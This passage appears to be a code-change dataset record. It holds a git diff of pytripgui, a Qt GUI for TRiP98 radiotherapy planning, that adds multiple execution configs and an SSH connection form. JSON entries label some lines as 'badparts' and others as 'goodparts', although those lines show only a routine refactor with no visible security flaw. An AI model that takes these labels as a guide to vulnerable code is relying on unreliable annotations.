self._setup_ok_and_cancel_buttons_callbacks()\n+\n+    def _setup_ok_and_cancel_buttons_callbacks(self):\n+        self.set_ok_callback(self._execute)\n+        self.set_cancel_callback(self._exit)\n+\n+    def set_ok_callback(self, fun):\n+        self._ui.accept_buttonBox.accepted.connect(fun)\n+\n+    def set_cancel_callback(self, fun):\n+        self._ui.accept_buttonBox.rejected.connect(fun)\n+\n+    def _execute(self):\n+        self.config = self._configs.current_data\n+        self._exit()\n+\n+    def _exit(self):\n+        self._ui.close()\n+\n+    def show(self):\n+        self._ui.show()\n+        self._ui.exec_()\ndiff --git a\/pytripgui\/view\/qt_gui.py b\/pytripgui\/view\/qt_gui.py\nindex 77196d8d..0f9d869b 100644\n--- a\/pytripgui\/view\/qt_gui.py\n+++ b\/pytripgui\/view\/qt_gui.py\n@@ -26,6 +26,13 @@ def __init__(self, parent=None):\n         uic.loadUi(ui_path, self)\n \n \n+class UiExecuteConfigDialog(QtWidgets.QDialog):\n+    def __init__(self, parent=None):\n+        super(UiExecuteConfigDialog, self).__init__(parent)\n+        ui_path = os.path.join(current_directory, 'execute_config.ui')\n+        uic.loadUi(ui_path, self)\n+\n+\n class UiKernelDialog(QtWidgets.QDialog):\n     def __init__(self):\n         super(UiKernelDialog, self).__init__()\n@@ -77,7 +84,8 @@ def on_create_empty(self):\n     @on_create_empty.setter\n     def on_create_empty(self, callback):\n         self._create_empty_callback = callback\n-        self.createEmpty_pushButton.clicked.connect(self._create_empty_internal_callback)\n+        self.createEmpty_pushButton.clicked.connect(\n+            self._create_empty_internal_callback)\n \n     def _create_empty_internal_callback(self):\n         self._create_empty_callback()\n@@ -90,7 +98,8 @@ def on_open_voxelplan(self):\n     @on_open_voxelplan.setter\n     def on_open_voxelplan(self, callback):\n         self._open_voxelplan_callback = callback\n-        self.openVoxelplan_pushButton.clicked.connect(self._on_open_voxelplan_internal_callback)\n+        self.openVoxelplan_pushButton.clicked.connect(\n+            self._on_open_voxelplan_internal_callback)\n \n     def _on_open_voxelplan_internal_callback(self):\n         self._open_voxelplan_callback()\n@@ -103,7 +112,8 @@ def on_open_dicom(self):\n     @on_open_dicom.setter\n     def on_open_dicom(self, callback):\n         self._open_dicom_callback = callback\n-        self.openDicom_pushButton.clicked.connect(self._on_open_dicom_internal_callback)\n+        self.openDicom_pushButton.clicked.connect(\n+            self._on_open_dicom_internal_callback)\n \n     def _on_open_dicom_internal_callback(self):\n         self._open_dicom_callback()\ndiff --git a\/pytripgui\/view\/qt_view_adapter.py b\/pytripgui\/view\/qt_view_adapter.py\nnew file mode 100644\nindex 00000000..b710c7ea\n--- \/dev\/null\n+++ b\/pytripgui\/view\/qt_view_adapter.py\n@@ -0,0 +1,105 @@\n+from PyQt5.QtWidgets import QMessageBox\n+\n+\n+class LineEdit:\n+    def __init__(self, line_edit):\n+        self._ui = line_edit\n+\n+    @property\n+    def text(self):\n+        return self._ui.text()\n+\n+    @text.setter\n+    def text(self, text):\n+        self._ui.setText(text)\n+\n+    def emit_on_text_change(self, callback):\n+        \"\"\"\n+        WHen user have changed text in UI, callback will be called with new text:\n+        callback(new_text)\n+        \"\"\"\n+        self._ui.textChanged.connect(callback)\n+\n+\n+class PushButton:\n+    def __init__(self, push_button):\n+        self._ui = push_button\n+\n+    def emit_on_click(self, callback):\n+        self._ui.clicked.connect(callback)\n+\n+\n+class ComboBox:\n+    def __init__(self, combo_box):\n+        self._ui = combo_box\n+        self.last_index = 0\n+\n+        self._on_item_change_user_callback = None\n+        self._ui.currentIndexChanged.connect(self._on_item_change_callback)\n+\n+    def fill(self, combo_list, lambda_names):\n+        self.last_index = 0\n+        self._ui.clear()\n+        for item in combo_list:\n+            self._ui.addItem(lambda_names(item), item)\n+\n+    def append_element(self, data, name):\n+        self._ui.addItem(name, data)\n+        self.current_index = self.count - 1\n+\n+    def emit_on_item_change(self, callback):\n+        self._on_item_change_user_callback = callback\n+\n+    def _on_item_change_callback(self, current_item):\n+        if self._on_item_change_user_callback:\n+            self._on_item_change_user_callback()\n+        self.last_index = self.current_index\n+\n+    def set_current_item_text(self, text):\n+        self._ui.setItemText(self.current_index, text)\n+\n+    def remove_current_item(self):\n+        self.last_index = -1\n+        self._ui.removeItem(self.current_index)\n+\n+    @property\n+    def current_index(self):\n+        return self._ui.currentIndex()\n+\n+    @property\n+    def count(self):\n+        return self._ui.count()\n+\n+    @current_index.setter\n+    def current_index(self, index):\n+        self._ui.setCurrentIndex(index)\n+\n+    @property\n+    def data(self):\n+        data = list()\n+        for i in range(self.count):\n+            data.append(self._ui.itemData(i))\n+        return data\n+\n+    @property\n+    def current_data(self):\n+        return self._ui.currentData()\n+\n+    @property\n+    def last_data(self):\n+        return self._ui.itemData(self.last_index)\n+\n+    @property\n+    def count(self):\n+        return self._ui.count()\n+\n+\n+class UserInfoBox:\n+    def __init__(self, parent_ui):\n+        self._parent_ui = parent_ui\n+\n+    def show_error(self, name, content):\n+        QMessageBox.critical(self._parent_ui, name, content)\n+\n+    def show_info(self, name, content):\n+        QMessageBox.information(self._parent_ui, name, content)\n\\ No newline at end of file\ndiff --git a\/pytripgui\/view\/trip_config.ui b\/pytripgui\/view\/trip_config.ui\nindex 73b1a6d6..45984cfb 100644\n--- a\/pytripgui\/view\/trip_config.ui\n+++ b\/pytripgui\/view\/trip_config.ui\n@@ -6,200 +6,422 @@\n    <rect>\n     <x>0<\/x>\n     <y>0<\/y>\n-    <width>680<\/width>\n-    <height>358<\/height>\n+    <width>948<\/width>\n+    <height>745<\/height>\n    <\/rect>\n   <\/property>\n+  <property name=\"sizePolicy\">\n+   <sizepolicy hsizetype=\"Preferred\" vsizetype=\"Maximum\">\n+    <horstretch>0<\/horstretch>\n+    <verstretch>0<\/verstretch>\n+   <\/sizepolicy>\n+  <\/property>\n   <property name=\"windowTitle\">\n    <string>TRiP98 Configuration<\/string>\n   <\/property>\n   <layout class=\"QVBoxLayout\" name=\"verticalLayout\">\n    <item>\n     <widget class=\"QTabWidget\" name=\"tabWidget\">\n+     <property name=\"enabled\">\n+      <bool>true<\/bool>\n+     <\/property>\n      <property name=\"currentIndex\">\n       <number>0<\/number>\n      <\/property>\n      <widget class=\"QWidget\" name=\"tab_access\">\n       <attribute name=\"title\">\n-       <string>Access<\/string>\n+       <string>TRiP98<\/string>\n       <\/attribute>\n-      <layout class=\"QFormLayout\" name=\"formLayout_2\">\n-       <item row=\"1\" column=\"0\">\n-        <widget class=\"QLabel\" name=\"wdirpath_label\">\n-         <property name=\"text\">\n-          <string>Working dir<\/string>\n-         <\/property>\n-        <\/widget>\n-       <\/item>\n-       <item row=\"1\" column=\"1\">\n-        <layout class=\"QHBoxLayout\" name=\"wdir_horizontalLayout\">\n-         <item>\n-          <widget class=\"QLineEdit\" name=\"wdirPath_lineEdit\">\n-           <property name=\"sizePolicy\">\n-            <sizepolicy hsizetype=\"Expanding\" vsizetype=\"Fixed\">\n-             <horstretch>0<\/horstretch>\n-             <verstretch>0<\/verstretch>\n-            <\/sizepolicy>\n-           <\/property>\n-          <\/widget>\n-         <\/item>\n-         <item>\n-          <widget class=\"QPushButton\" name=\"wdirPath_pushButton\">\n-           <property name=\"text\">\n-            <string>Browse<\/string>\n-           <\/property>\n-          <\/widget>\n-         <\/item>\n-        <\/layout>\n-       <\/item>\n-       <item row=\"2\" column=\"0\">\n-        <widget class=\"QLabel\" name=\"tripAccess_label\">\n-         <property name=\"text\">\n-          <string>TRiP98 install<\/string>\n-         <\/property>\n-        <\/widget>\n-       <\/item>\n-       <item row=\"2\" column=\"1\">\n-        <widget class=\"QComboBox\" name=\"tripAccess_comboBox\">\n-         <item>\n-          <property name=\"text\">\n-           <string>Local<\/string>\n-          <\/property>\n-         <\/item>\n-         <item>\n-          <property name=\"text\">\n-           <string>Remote<\/string>\n-          <\/property>\n-         <\/item>\n-        <\/widget>\n-       <\/item>\n-       <item row=\"3\" column=\"0\">\n-        <widget class=\"QLabel\" name=\"tripPath_label\">\n-         <property name=\"text\">\n-          <string>TRiP98 path<\/string>\n-         <\/property>\n-        <\/widget>\n-       <\/item>\n-       <item row=\"3\" column=\"1\">\n-        <layout class=\"QHBoxLayout\" name=\"horizontalLayout_3\">\n-         <item>\n-          <widget class=\"QLineEdit\" name=\"tripPath_lineEdit\"\/>\n-         <\/item>\n-         <item>\n-          <widget class=\"QPushButton\" name=\"tripPath_pushButton\">\n-           <property name=\"text\">\n-            <string>Browse<\/string>\n-           <\/property>\n-          <\/widget>\n-         <\/item>\n-        <\/layout>\n-       <\/item>\n-       <item row=\"8\" column=\"0\" colspan=\"2\">\n-        <widget class=\"QGroupBox\" name=\"remote_tab\">\n-         <property name=\"sizePolicy\">\n-          <sizepolicy hsizetype=\"Preferred\" vsizetype=\"Maximum\">\n-           <horstretch>0<\/horstretch>\n-           <verstretch>0<\/verstretch>\n-          <\/sizepolicy>\n-         <\/property>\n+      <layout class=\"QVBoxLayout\" name=\"verticalLayout_4\">\n+       <item>\n+        <widget class=\"QGroupBox\" name=\"configs\">\n          <property name=\"title\">\n-          <string>Remote<\/string>\n+          <string>TRiP98 configs<\/string>\n          <\/property>\n-         <layout class=\"QFormLayout\" name=\"formLayout\">\n-          <item row=\"0\" column=\"1\">\n-           <widget class=\"QLineEdit\" name=\"serverip_lineEdit\"\/>\n-          <\/item>\n-          <item row=\"1\" column=\"0\">\n-           <widget class=\"QLabel\" name=\"username_label\">\n-            <property name=\"text\">\n-             <string>Username<\/string>\n-            <\/property>\n-           <\/widget>\n-          <\/item>\n-          <item row=\"1\" column=\"1\">\n-           <widget class=\"QLineEdit\" name=\"username_lineEdit\"\/>\n-          <\/item>\n-          <item row=\"2\" column=\"0\">\n-           <widget class=\"QLabel\" name=\"password_label\">\n-            <property name=\"text\">\n-             <string>Password<\/string>\n+         <layout class=\"QVBoxLayout\" name=\"verticalLayout_5\">\n+          <item>\n+           <widget class=\"QComboBox\" name=\"configs_comboBox\">\n+            <property name=\"enabled\">\n+             <bool>true<\/bool>\n             <\/property>\n            <\/widget>\n           <\/item>\n-          <item row=\"2\" column=\"1\">\n-           <widget class=\"QLineEdit\" name=\"password_lineEdit\"\/>\n-          <\/item>\n-          <item row=\"0\" column=\"0\">\n-           <widget class=\"QLabel\" name=\"serverip_label\">\n-            <property name=\"text\">\n-             <string>Server IP\/Hostname<\/string>\n-            <\/property>\n-           <\/widget>\n+          <item>\n+           <layout class=\"QHBoxLayout\" name=\"horizontalLayout_2\">\n+            <item>\n+             <widget class=\"QPushButton\" name=\"add_pushButton\">\n+              <property name=\"enabled\">\n+               <bool>true<\/bool>\n+              <\/property>\n+              <property name=\"text\">\n+               <string>Add<\/string>\n+              <\/property>\n+             <\/widget>\n+            <\/item>\n+            <item>\n+             <widget class=\"QPushButton\" name=\"remove_pushButton\">\n+              <property name=\"enabled\">\n+               <bool>true<\/bool>\n+              <\/property>\n+              <property name=\"text\">\n+               <string>Delete<\/string>\n+              <\/property>\n+             <\/widget>\n+            <\/item>\n+           <\/layout>\n           <\/item>\n          <\/layout>\n         <\/widget>\n        <\/item>\n-      <\/layout>\n-     <\/widget>\n-     <widget class=\"QWidget\" name=\"tab_lut\">\n-      <attribute name=\"title\">\n-       <string>Lookup tables<\/string>\n-      <\/attribute>\n-      <layout class=\"QVBoxLayout\" name=\"verticalLayout_2\">\n        <item>\n-        <widget class=\"QGroupBox\" name=\"groupBox_hlut\">\n+        <widget class=\"QGroupBox\" name=\"groupBox_3\">\n+         <property name=\"enabled\">\n+          <bool>true<\/bool>\n+         <\/property>\n          <property name=\"title\">\n-          <string>Hounsfield lookup table (HLUT)<\/string>\n+          <string>TRiP98 config details<\/string>\n          <\/property>\n-         <layout class=\"QHBoxLayout\" name=\"horizontalLayout_4\">\n-          <item>\n-           <widget class=\"QLineEdit\" name=\"hlut_lineEdit\"\/>\n+         <layout class=\"QGridLayout\" name=\"gridLayout_2\">\n+          <item row=\"3\" column=\"0\">\n+           <widget class=\"QGroupBox\" name=\"ssh_GroupBox\">\n+            <property name=\"enabled\">\n+             <bool>false<\/bool>\n+            <\/property>\n+            <property name=\"title\">\n+             <string>SSH Connection<\/string>\n+            <\/property>\n+            <layout class=\"QFormLayout\" name=\"ssh_formLayout\">\n+             <item row=\"0\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"host_label\">\n+               <property name=\"text\">\n+                <string>Server IP\/Hostname<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"0\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"host_lineEdit\"\/>\n+             <\/item>\n+             <item row=\"1\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"username_label\">\n+               <property name=\"text\">\n+                <string>Username<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"1\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"username_lineEdit\"\/>\n+             <\/item>\n+             <item row=\"2\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"label_2\">\n+               <property name=\"text\">\n+                <string>Private key (optional)<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"2\" column=\"1\">\n+              <layout class=\"QHBoxLayout\" name=\"horizontalLayout_3\">\n+               <item>\n+                <widget class=\"QLineEdit\" name=\"pkey_lineEdit\"\/>\n+               <\/item>\n+               <item>\n+                <widget class=\"QPushButton\" name=\"pKey_pushButton\">\n+                 <property name=\"text\">\n+                  <string>Browse<\/string>\n+                 <\/property>\n+                <\/widget>\n+               <\/item>\n+              <\/layout>\n+             <\/item>\n+             <item row=\"3\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"password_lineEdit\">\n+               <property name=\"echoMode\">\n+                <enum>QLineEdit::Password<\/enum>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"3\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"password_label\">\n+               <property name=\"text\">\n+                <string>Password (user\/key)<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"4\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"wdirRemote_lineEdit\"\/>\n+             <\/item>\n+             <item row=\"4\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"wdirRemote_label\">\n+               <property name=\"text\">\n+                <string>Remote working directory<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"5\" column=\"1\">\n+              <widget class=\"QPushButton\" name=\"testSsh_pushButton\">\n+               <property name=\"text\">\n+                <string>Test ssh configuration<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+            <\/layout>\n+           <\/widget>\n           <\/item>\n-          <item>\n-           <widget class=\"QPushButton\" name=\"hlut_pushButton\">\n-            <property name=\"text\">\n-             <string>Browse<\/string>\n+          <item row=\"7\" column=\"0\">\n+           <widget class=\"QGroupBox\" name=\"remoteLocal_groupBox\">\n+            <property name=\"sizePolicy\">\n+             <sizepolicy hsizetype=\"Preferred\" vsizetype=\"Maximum\">\n+              <horstretch>0<\/horstretch>\n+              <verstretch>0<\/verstretch>\n+             <\/sizepolicy>\n+            <\/property>\n+            <property name=\"title\">\n+             <string>Local paths<\/string>\n             <\/property>\n+            <layout class=\"QGridLayout\" name=\"gridLayout\">\n+             <item row=\"5\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"hlut_lineEdit\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Expanding\" vsizetype=\"Minimum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"7\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"label\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Preferred\" vsizetype=\"Maximum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+               <property name=\"text\">\n+                <string>Stopping power table (dE\/dx)<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"7\" column=\"2\">\n+              <widget class=\"QPushButton\" name=\"dedx_pushButton\">\n+               <property name=\"text\">\n+                <string>Browse<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"1\" column=\"2\">\n+              <widget class=\"QPushButton\" name=\"tripPath_pushButton\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Minimum\" vsizetype=\"Minimum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+               <property name=\"text\">\n+                <string>Browse<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"1\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"tripPath_lineEdit\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Expanding\" vsizetype=\"Minimum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"1\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"tripPath_label\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Preferred\" vsizetype=\"Minimum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+               <property name=\"text\">\n+                <string>TRiP98 path<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"7\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"dedx_lineEdit\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Expanding\" vsizetype=\"Minimum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"5\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"hlut_label\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Preferred\" vsizetype=\"Maximum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+               <property name=\"text\">\n+                <string>Hounsfield lookup table (HLUT)<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"5\" column=\"2\">\n+              <widget class=\"QPushButton\" name=\"hlut_pushButton\">\n+               <property name=\"text\">\n+                <string>Browse<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+            <\/layout>\n            <\/widget>\n           <\/item>\n-         <\/layout>\n-        <\/widget>\n-       <\/item>\n-       <item>\n-        <widget class=\"QGroupBox\" name=\"groupBox\">\n-         <property name=\"title\">\n-          <string>Stopping power table (dE\/dx)<\/string>\n-         <\/property>\n-         <layout class=\"QHBoxLayout\" name=\"horizontalLayout_2\">\n-          <item>\n-           <widget class=\"QLineEdit\" name=\"dedx_lineEdit\"\/>\n+          <item row=\"0\" column=\"0\">\n+           <widget class=\"QFrame\" name=\"formFrame\">\n+            <layout class=\"QFormLayout\" name=\"formLayout\">\n+             <property name=\"sizeConstraint\">\n+              <enum>QLayout::SetMaximumSize<\/enum>\n+             <\/property>\n+             <property name=\"horizontalSpacing\">\n+              <number>6<\/number>\n+             <\/property>\n+             <item row=\"0\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"configName_lineEdit\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Expanding\" vsizetype=\"Maximum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"1\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"label_4\">\n+               <property name=\"text\">\n+                <string>Execute on<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"1\" column=\"1\">\n+              <layout class=\"QHBoxLayout\" name=\"horizontalLayout_6\">\n+               <property name=\"sizeConstraint\">\n+                <enum>QLayout::SetMaximumSize<\/enum>\n+               <\/property>\n+               <item>\n+                <widget class=\"QRadioButton\" name=\"local_radioButton\">\n+                 <property name=\"sizePolicy\">\n+                  <sizepolicy hsizetype=\"Minimum\" vsizetype=\"Maximum\">\n+                   <horstretch>0<\/horstretch>\n+                   <verstretch>0<\/verstretch>\n+                  <\/sizepolicy>\n+                 <\/property>\n+                 <property name=\"text\">\n+                  <string>Local machine<\/string>\n+                 <\/property>\n+                 <property name=\"checked\">\n+                  <bool>true<\/bool>\n+                 <\/property>\n+                <\/widget>\n+               <\/item>\n+               <item>\n+                <widget class=\"QRadioButton\" name=\"remote_radioButton\">\n+                 <property name=\"sizePolicy\">\n+                  <sizepolicy hsizetype=\"Minimum\" vsizetype=\"Maximum\">\n+                   <horstretch>0<\/horstretch>\n+                   <verstretch>0<\/verstretch>\n+                  <\/sizepolicy>\n+                 <\/property>\n+                 <property name=\"text\">\n+                  <string>Remote machine<\/string>\n+                 <\/property>\n+                <\/widget>\n+               <\/item>\n+              <\/layout>\n+             <\/item>\n+             <item row=\"0\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"label_3\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Preferred\" vsizetype=\"Maximum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+               <property name=\"text\">\n+                <string>Config name<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+            <\/layout>\n+           <\/widget>\n           <\/item>\n-          <item>\n-           <widget class=\"QPushButton\" name=\"dedx_pushButton\">\n-            <property name=\"text\">\n-             <string>Browse<\/string>\n+          <item row=\"9\" column=\"0\">\n+           <widget class=\"QGroupBox\" name=\"verticalGroupBox\">\n+            <property name=\"title\">\n+             <string>Only local paths<\/string>\n             <\/property>\n+            <layout class=\"QGridLayout\" name=\"gridLayout_3\">\n+             <item row=\"3\" column=\"0\">\n+              <widget class=\"QLabel\" name=\"wdirpath_label\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Preferred\" vsizetype=\"Minimum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+               <property name=\"text\">\n+                <string>Working directory<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"3\" column=\"1\">\n+              <widget class=\"QLineEdit\" name=\"wdirPath_lineEdit\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Expanding\" vsizetype=\"Minimum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+             <item row=\"3\" column=\"2\">\n+              <widget class=\"QPushButton\" name=\"wdirPath_pushButton\">\n+               <property name=\"sizePolicy\">\n+                <sizepolicy hsizetype=\"Minimum\" vsizetype=\"Minimum\">\n+                 <horstretch>0<\/horstretch>\n+                 <verstretch>0<\/verstretch>\n+                <\/sizepolicy>\n+               <\/property>\n+               <property name=\"text\">\n+                <string>Browse<\/string>\n+               <\/property>\n+              <\/widget>\n+             <\/item>\n+            <\/layout>\n            <\/widget>\n           <\/item>\n+          <item row=\"8\" column=\"0\">\n+           <spacer name=\"verticalSpacer\">\n+            <property name=\"orientation\">\n+             <enum>Qt::Vertical<\/enum>\n+            <\/property>\n+            <property name=\"sizeHint\" stdset=\"0\">\n+             <size>\n+              <width>20<\/width>\n+              <height>40<\/height>\n+             <\/size>\n+            <\/property>\n+           <\/spacer>\n+          <\/item>\n          <\/layout>\n         <\/widget>\n        <\/item>\n-       <item>\n-        <spacer name=\"verticalSpacer\">\n-         <property name=\"orientation\">\n-          <enum>Qt::Vertical<\/enum>\n-         <\/property>\n-         <property name=\"sizeHint\" stdset=\"0\">\n-          <size>\n-           <width>20<\/width>\n-           <height>20<\/height>\n-          <\/size>\n-         <\/property>\n-        <\/spacer>\n-       <\/item>\n       <\/layout>\n      <\/widget>\n      <widget class=\"QWidget\" name=\"tab_test\">\n+      <property name=\"enabled\">\n+       <bool>false<\/bool>\n+      <\/property>\n       <attribute name=\"title\">\n        <string>Test Config<\/string>\n       <\/attribute>\n@@ -309,7 +531,7 @@\n    <item>\n     <widget class=\"QDialogButtonBox\" name=\"accept_buttonBox\">\n      <property name=\"standardButtons\">\n-      <set>QDialogButtonBox::Cancel|QDialogButtonBox::Ok<\/set>\n+      <set>QDialogButtonBox::Cancel|QDialogButtonBox::Ok|QDialogButtonBox::Save<\/set>\n      <\/property>\n     <\/widget>\n    <\/item>\n","files":{"\/pytripgui\/app_logic\/app_callbacks.py":{"changes":[{"diff":"\n \n         patient = self.app_model.patient_tree.selected_item_patient()\n \n-        executor = GuiExecutor(self.app_model.trip_config, patient, plan,\n+        trip_config = ExecuteConfigView(self.app_model.trip_configs,\n+                                        self.parent_gui.ui)\n+        trip_config.show()\n+        if not trip_config.config:\n+            return\n+\n+        executor = GuiExecutor(trip_config.config, patient, plan,\n                                self._execute_finish_callback,\n                                self.parent_gui.ui)\n \n","add":7,"remove":1,"filename":"\/pytripgui\/app_logic\/app_callbacks.py","badparts":["        executor = GuiExecutor(self.app_model.trip_config, patient, plan,"],"goodparts":["        trip_config = ExecuteConfigView(self.app_model.trip_configs,","                                        self.parent_gui.ui)","        trip_config.show()","        if not trip_config.config:","            return","        executor = GuiExecutor(trip_config.config, patient, plan,"]},{"diff":"\n         logger.debug(\"TRiP config menu()\")\n \n         from pytripgui.config_vc import ConfigController\n-\n         view = self.parent_gui.get_trip_config_view()\n \n-        controller = ConfigController(self.app_model.trip_config, view)\n+        config = self.app_model.trip_configs\n+        controller = ConfigController(config, view)\n         controller.set_view_from_model()\n         view.show()\n \n         if controller.user_clicked_save:\n+            self.app_model.trip_configs = controller.model\n             self.settings.save()\n \n     def on_add_patient(self):","add":3,"remove":2,"filename":"\/pytripgui\/app_logic\/app_callbacks.py","badparts":["        controller = ConfigController(self.app_model.trip_config, view)"],"goodparts":["        config = self.app_model.trip_configs","        controller = ConfigController(config, view)","            self.app_model.trip_configs = controller.model"]},{"diff":"\n \n         patient = self.app_model.patient_tree.selected_item_patient()\n \n-        executor = GuiExecutor(self.app_model.trip_config, patient, plan,\n+        trip_config = ExecuteConfigView(self.app_model.trip_configs,\n+                                        self.parent_gui.ui)\n+        trip_config.show()\n+        if not trip_config.config:\n+            return\n+\n+        executor = GuiExecutor(trip_config.config, patient, plan,\n                                self._execute_finish_callback,\n                                self.parent_gui.ui)\n \n","add":7,"remove":1,"filename":"\/pytripgui\/app_logic\/app_callbacks.py","badparts":["        executor = GuiExecutor(self.app_model.trip_config, patient, plan,"],"goodparts":["        trip_config = ExecuteConfigView(self.app_model.trip_configs,","                                        self.parent_gui.ui)","        trip_config.show()","        if not trip_config.config:","            return","        executor = GuiExecutor(trip_config.config, patient, plan,"]},{"diff":"\n         logger.debug(\"TRiP config menu()\")\n \n         from pytripgui.config_vc import ConfigController\n-\n         view = self.parent_gui.get_trip_config_view()\n \n-        controller = ConfigController(self.app_model.trip_config, view)\n+        config = self.app_model.trip_configs\n+        controller = ConfigController(config, view)\n         controller.set_view_from_model()\n         view.show()\n \n         if controller.user_clicked_save:\n+            self.app_model.trip_configs = controller.model\n             self.settings.save()\n \n     def on_add_patient(self):","add":3,"remove":2,"filename":"\/pytripgui\/app_logic\/app_callbacks.py","badparts":["        controller = ConfigController(self.app_model.trip_config, view)"],"goodparts":["        config = self.app_model.trip_configs","        controller = ConfigController(config, view)","            self.app_model.trip_configs = controller.model"]}],"source":"\nfrom pytripgui.plan_vc.plan_view import PlanQtView from pytripgui.plan_vc.plan_cont import PlanController from pytripgui.field_vc.field_view import FieldQtView from pytripgui.field_vc.field_cont import FieldController from pytripgui.app_logic.viewcanvas import ViewCanvases from pytripgui.tree_vc.TreeItems import PatientItem, PlanItem, FieldItem from pytripgui.tree_vc.TreeItems import SimulationResultItem from pytripgui.messages import InfoMessages from pytripgui.app_logic.charts import Charts from pytripgui.app_logic.gui_executor import GuiExecutor from pytripgui.view.qt_gui import UiAddPatient from pytripgui.controller.settings_cont import SettingsController import os import logging logger=logging.getLogger(__name__) class AppCallback: def __init__(self, app_model, parent_gui): self.app_model=app_model self.parent_gui=parent_gui self.chart=Charts(self.parent_gui) self.settings=SettingsController(self.app_model) def on_open_voxelplan(self): patient=PatientItem() if self.open_voxelplan_callback(patient): self.app_model.patient_tree.add_new_item(None, patient) def on_open_dicom(self): patient=PatientItem() if self.open_dicom_callback(patient): self.app_model.patient_tree.add_new_item(None, patient) def on_execute_selected_plan(self): item=self.app_model.patient_tree.selected_item() if isinstance(item, FieldItem): plan=item.parent else: plan=item if not isinstance(plan, PlanItem): raise TypeError(\"You should select Field or Plan\") patient=self.app_model.patient_tree.selected_item_patient() executor=GuiExecutor(self.app_model.trip_config, patient, plan, self._execute_finish_callback, self.parent_gui.ui) executor.start() executor.show() def _execute_finish_callback(self, item): self.app_model.patient_tree.add_new_item(None, item) def on_add_new_plan(self): selected_patient=self.app_model.patient_tree.selected_item_patient() if not selected_patient: self.parent_gui.show_info(*InfoMessages[\"addNewPatient\"]) return self.new_item_callback(selected_patient) def on_kernels_configurator(self): \"\"\" Kernel dialog opened from window->settings->kernel \"\"\" from pytripgui.kernel_vc import KernelController model=self.app_model.kernels view=self.parent_gui.get_kernel_config_view() controller=KernelController(model, view) controller.set_view_from_model() view.show() if controller.user_clicked_save: self.settings.save() def 